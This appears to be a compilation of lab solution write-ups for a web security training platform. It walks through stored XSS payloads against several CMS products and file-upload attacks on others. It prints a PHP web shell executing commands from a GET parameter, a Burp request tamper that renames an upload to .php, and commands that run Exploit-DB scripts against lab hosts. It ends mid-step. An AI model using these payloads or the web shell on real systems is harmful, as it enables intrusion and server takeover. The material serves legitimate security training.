 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “yetiforce CRM vulnerability” and look for publicly available exploits. 
 
 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39998 
 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
URL: 
http://ocgvy1ejrur9vzo2zxsi0e3u1.mumbaix.attackdefenselabs.com/member.php?action=login 
 
Credentials: 
●
Username: ​admin 
●
Password: ​Password1 
 
Admin Dashboard 
 
 
 
Step 4: ​Select the second icon on the left side bar and choose Accounts section under it. 
 
 
 
Accounts Section: 
 
 
 
Step 5: ​Select the Account name test. 
 
 
 
Step 6: ​Click on Comments section. 
 
 
 
 
 
 
 
Step 7: ​Inject the payload in the comment text box. 
 
Payload: ​<img src=x onerror=alert('XSS');> 
 
 
 
Click on the Post button. 
 
 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
YetiForce (​https://yetiforce.com/​) 
2.
YetiForce CRM < 3.1 - Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/39998​)  
 
 
 
Name 
XhP CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=331 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “xhp xss exploit db” and look for publicly available exploits. 
 
 
 
 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40576 
 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
 
URL: ​http://xgrnvhx39nwhlznweh3pr1c98.asiax.attackdefenselabs.com/index.php?page=0 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
Step 4: ​Navigate to the Site Settings. 
 
 
 
Step 5: ​Inject the payload in Site name field. 
 
Payload:​ " onclick="alert('XSS')" 
 
 
Click on the Update button. 
 
 
 
 
 
 
Step 6: ​Click on the logo of the website. 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
 
 
 
References:  
 
1.
XhP CMS (​https://sourceforge.net/projects/xhp/​) 
2.
XhP CMS 0.5.1 - Cross-Site Request Forgery / Persistent Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/40576​)  
 
 
 
Name 
Kajona 
URL 
https://www.attackdefense.com/challengedetails?cid=332 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “kajona vulnerability” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40395 
 
 
 
Step 3: ​Navigate to the vulnerable page. 
 
 
URL: 
http://sjf73dpar4ds5sf8bu51k9x1n.asiax.attackdefenselabs.com/index.php?page=postacommen
t 
 
 
 
 
Step 4: ​Click on “Write a Comment”. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Inject the payload in Subject field and fill any data in Name and Message textbox. 
 
Name: ​test 
Payload: ​');alert('1 
Message:​ this is a test 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on Submit button. 
 
 
 
Step 6:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the URL provided at exploit db page. 
 
URL: 
http://sjf73dpar4ds5sf8bu51k9x1n.asiax.attackdefenselabs.com/index.php?admin=1&module=p
ostacomment&action=list 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
Step 7: ​Click on Edit tags button located at the right option bar of the comment. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Kajona (​https://www.kajona.de/​) 
2.
Kajona 4.7 - Cross-Site Scripting / Directory Traversal 
(​https://www.exploit-db.com/exploits/40395​)  
 
 
 
Name 
Grav CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=333 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “grav cms vulnerability” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/42131 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description.Navigate to the URL provided at exploit db page. 
 
URL: ​http://7ycbn5814w9sln5g1kikulk59.asiax.attackdefenselabs.com/admin/pages/home 
 
Credentials: 
●
Username: ​admin 
●
Password: ​Password1 
 
Login Page 
 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Replace all the text with the payload. 
 
Payload: ​[Click Me](javascript:alert(1)) 
 
 
 
Click on the Save button. 
 
 
 
Step 5: ​Navigate to the homepage of the CMS and click on “Click me” 
 
 
 
The XSS payload triggered successfully. 
 
 
 
 
 
 
 
References:  
 
1.
Grav CMS (​https://getgrav.org/​) 
2.
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting 
(​https://www.exploit-db.com/exploits/42131​)  
 
 
 
Name 
Zen Cart 
URL 
https://www.attackdefense.com/challengedetails?cid=491 
Type 
Real World Webapps : Stored XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “zencart xss exploit db” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the payload required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/17308 
 
 
 
Step 3:​ The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. 
 
 
URL:​ http://yzudo6kxuduisqflsq6elwqlv.asiax.attackdefenselabs.com/Admin/ 
 
Credentials: 
●
Username: ​admin 
●
Password: ​Password1 
 
Login Page 
 
Admin Dashboard 
 
 
 
The password has expired, enter new password as “Password@!23”. 
 
 
 
Click on Submit. 
 
 
 
Step 4: ​Navigate to the Vulnerable URL provided at exploit-db. 
 
 
 
URL: 
http://yzudo6kxuduisqflsq6elwqlv.asiax.attackdefenselabs.com/Admin/zones.php?page=1&actio
n=new 
 
 
 
Step 5: ​Inject the payload in Zones Name and Zone Name field. 
 
Payload: ​"><script>alert("XSS")</script> 
 
 
 
 
Step 6: ​Click on the insert button. 
 
 
 
The XSS payload triggered successfully. 
 
 
References:  
 
1.
Zen Cart (​http://www.zen-cart.com​) 
2.
Zen Cart 1.3.9h - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/17308​)  
 
 
 
Name 
 WeBid 
URL 
https://www.attackdefense.com/challengedetails?cid=7  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “webid file upload” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the php script required to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36155 
 
 
 
 
 
 
 
 
Step 3: ​Save the php script provided at the Exploit DB link as exploit.php 
 
 
Command: ​cat exploit.php 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​php exploit.php 
 
 
 
The exploitation script requires the hostname and the path of the web application to be passed 
as arguments.  
 
 
Step 5: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
php exploit.php vow8biujq2my5r63aoez4o30r.public1.attackdefenselabs.com / 
id 
whoami 
 
 
 
 
 
 
 
 
 
 
 
References:  
 
1.
Webid (​http://www.webidsupport.com/​)  
2.
WeBid 1.1.1 - Unrestricted Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/36155​)  
 
 
 
 
 
Name 
Getsimple CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=14  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Note: ​For this challenge, the flash plugin of the browser need to be enabled. 
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “getsimple cms file upload exploit db” and look for publically available 
exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40008 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application and navigate to the file upload portal. 
 
Navigate to the admin portal of the web application. The admin portal can be accessed by 
navigating to “/admin” directory. (Many web applications have their admin portal at “/admin” 
directory) 
 
 
 
 
 
 
 
 
 
 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: siteadmin 
●
Password: ​password213 
 
Admin Dashboard: 
 
 
 
Navigate to “Files tab”. 
 
 
 
Since the web application requires Flash player, one of the buttons is not rendered. Click on the 
Missing plugin icon (below the “File Management” button). 
 
The “Run Flash” popup will appear. 
 
 
 
Click on the “Allow” Button. 
 
 
 
 
 
 
The “Upload files and/or images...” button was rendered. In case of Mozilla Firefox, the button 
will be rendered automatically provided flash player is already installed on the machine. 
 
Step 4: ​Create a PHP web shell. 
 
Save the below given php script as “shell.php%” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.php% 
 
 
 
 
Step 5: ​Click on the “Upload files and/or images...” button and upload the PHP web shell. 
 
 
 
Upon successful upload the filename will be listed on the web page. 
 
 
 
Step 6:  ​Access the uploaded web shell by clicking on the “shell.php” hyperlink. 
 
URL: ​http://ncglfb6xckieybrx7ei2b2t78.asia.attackdefenselabs.com/data/uploads/shell.php 
 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 7: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://ncglfb6xckieybrx7ei2b2t78.asia.attackdefenselabs.com/data/uploads/shell.php?cmd=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
Getsimple CMS  (​http://get-simple.info/download/​)  
2.
Getsimple CMS 3.3.10 - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/40008​)  
 
 
 
 
 
Name 
Roxy Fileman 
URL 
https://www.attackdefense.com/challengedetails?cid=26  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Roxy Fileman File upload exploit db” and look for publically available 
exploits.  
 
 
 
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39963  
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Create a PHP web shell. 
 
Save the below given php script as “shell.jpg” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.jpg 
 
 
 
 
Step 4: ​Click on the “Add file” and upload the PHP web shell. 
 
 
 
 
 
Click on “Upload” button. 
 
 
Successful file upload: 
 
 
 
 
Step 5: ​Modify the extension of the uploaded PHP web shell from “jpg” to “php”. 
 
Right click on the uploaded file and click on “Rename” option. 
 
 
 
Modify the file name from “shell.jpg” to “shell.php”. 
 
 
 
Click on “Rename” button and intercept the request with burp suite. 
 
Check Appendix to learn how to configure Burp Suite. 
 
Intercepted Request: 
 
 
 
 
 
 
Modify the URI to “/php/movefile.php” and prepend the full path in parameter “n” (The full path is 
mentioned in “f” parameter value) 
 
Modify the URI: 
 
Before: ​/php/renamefile.php?f=%2Fapp%2FUploads%2Fshell.jpg&n=shell.php 
 
After: 
/php/movefile.php?f=%2Fapp%2FUploads%2Fshell.jpg&n=%2Fapp%2FUploads%2Fshell.php 
 
Modify the POST data: 
 
Before: ​f=%2Fapp%2FUploads%2Fshell.jpg&n=shell.php 
 
After: ​f=%2Fapp%2FUploads%2Fshell.jpg&n=%2Fapp%2FUploads%2shell.php 
 
 
 
 
 
 
 
 
 
 
 
Forward the request and turn off the intercept. 
 
 
 
The file was renamed as “shell.php”. 
 
 
Step 6: ​The parent directory on the left panel is “Uploads”. Navigate to the “Uploads” directory 
on the web server. 
 
URL: ​http://3bmz6wqiyokjyu2rrm2h16fgu.asia.attackdefenselabs.com/Uploads/ 
 
 
 
 
 
 
 
 
 
 
Step 7: ​Access the uploaded web shell. 
 
URL: ​http://3bmz6wqiyokjyu2rrm2h16fgu.asia.attackdefenselabs.com/Uploads/shell.php 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 8: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://3bmz6wqiyokjyu2rrm2h16fgu.asia.attackdefenselabs.com/Uploads/shell.php?cmd=id 
 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
Roxy Fileman (​http://www.roxyfileman.com​) 
2.
Roxy Fileman 1.4.4 - Arbitrary File Upload (​https://www.exploit-db.com/exploits/39963​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
B2Evolution 
URL 
https://www.attackdefense.com/challengedetails?cid=27  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “B2Evolution file upload” and look for publically available exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41011 
 
 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application and navigate to the URL provided at exploit db link. 
 
Click on the “Log in” button on the top right corner and login to the web application. The login 
credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: ​zMWWcUrwdNB 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
Navigate to the vulnerable web page. 
 
URL: 
http://16cyp8fom8zkvgfpt897ok1ed.asia.attackdefenselabs.com/index.php/a/extended-post  
 
 
 
Scroll down to the comment section. 
 
 
 
Step 4: ​Create a PHP web shell. 
 
Save the below given php script as “shell.php” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat ~/Downloads/shell.php 
 
 
 
Step 5: ​Click on the “Choose File” button and upload the PHP web shell. 
 
 
 
Click on the “Preview/Add file” button. 
 
 
 
Preview:  
 
 
Open the hyperlink “shell.php” in a new tab. 
 
 
The content of PHP file is displayed on the web page. A script process the uploaded file and 
displays its content. The uploaded PHP web shell is stored somewhere on the webserver.  
 
The path parameter has value “comments/p19/shell.php” 
 
Step 6: ​Find the location of the uploaded file. 
 
Scroll down, upload an image and find the location where the image is stored on the web 
server. 
 
 
 
 
 
 
Click on the “Choose File” button and upload an image. 
 
 
 
 
 
Click on the “Preview/Add file” button. 
 
 
 
Right click on the image and open it a new tab. 
 
 
 
The image is stored in the directory “media/users/admin/comments/p19” on the web server. 
 
Since the value of path variable had value “comments/p19/shell.php”, it can be concluded that 
the uploaded files are stored in the directory “media/users/admin/comments/p19” on the web 
server. 
 
Step 7: ​Access the uploaded web shell. 
 
URL: 
http://16cyp8fom8zkvgfpt897ok1ed.asia.attackdefenselabs.com/media/users/admin/comments/
p19/shell.php 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 8: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://16cyp8fom8zkvgfpt897ok1ed.asia.attackdefenselabs.com/media/users/admin/comments/
p19/shell.php?cmd=id  
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
b2evolution (​https://b2evolution.net/​) 
2.
b2evolution 6.8.2 - Arbitrary File Upload (​https://www.exploit-db.com/exploits/41011​)  
 
 
 
 
 
Name 
AppRain CMF 
URL 
https://www.attackdefense.com/challengedetails?cid=28  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “apprain cmf file upload” and look for publically available exploits.  
 
 
 
The exploit db link contains the php script required to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/18392 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Save the php script provided at the Exploit DB link as exploit.php 
 
Command: ​cat exploit.php 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Check the usage information of the exploitation script.  
 
Command: ​php exploit.php 
 
 
 
 
The exploitation script requires the hostname and the path of the web application to be passed 
as arguments.  
 
Step 5: ​Exploit the vulnerable web application. 
 
Run the exploitation script with required arguments.  
 
Commands:  
php exploit.php vow8biujq2my5r63aoez4o30r.public1.attackdefenselabs.com / 
id 
whoami 
 
 
 
References:  
 
1.
appRain CMF (​http://www.apprain.com/​)  
2.
appRain CMF 0.1.5 - 'Uploadify.php' Unrestricted Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/18392​)  
 
 
 
 
 
Name 
Libretto CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=240  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Note: ​For this challenge, the flash plugin of the browser need to be enabled. 
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “libretto cms file upload exploit db” and look for publically available 
exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/26213 
 
 
 
 
 
 
 
 
 
Step 3: ​Navigate to the target URL provided at the exploit db link. 
 
URL: 
http://vec8yps0smsch0vtnxoo125xh.asia.attackdefenselabs.com/adm/ui/js/ckeditor/plugins/pgrfil
emanager/PGRFileManager.php 
 
 
 
 
 
 
 
 
 
 
 
Since the web application requires Flash player, one of the buttons is not rendered. Click on the 
Missing plugin icon (left of Upload files button). 
 
The “Run Flash” popup will appear. 
 
 
 
Click on the “Allow” Button. 
 
 
The files button is rendered. In case of Mozilla Firefox, the button will be rendered automatically 
provided flash player is already installed on the machine. 
 
Step 4: ​Create a PHP web shell. 
 
Save the below given php script as “shell.doc” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.doc 
 
 
 
Step 5: ​Click on the “FILES” button and upload the PHP web shell. 
 
Click on the “FILES” button. 
 
 
 
Upload the web shell. 
 
 
 
 
Upon successful upload, the file will be listed on the web page. 
 
 
 
Step 6: ​Modify the extension of the uploaded file to “php”. 
 
Right click on the thumbnail of the uploaded PHP web shell and click on “rename”. 
 
 
 
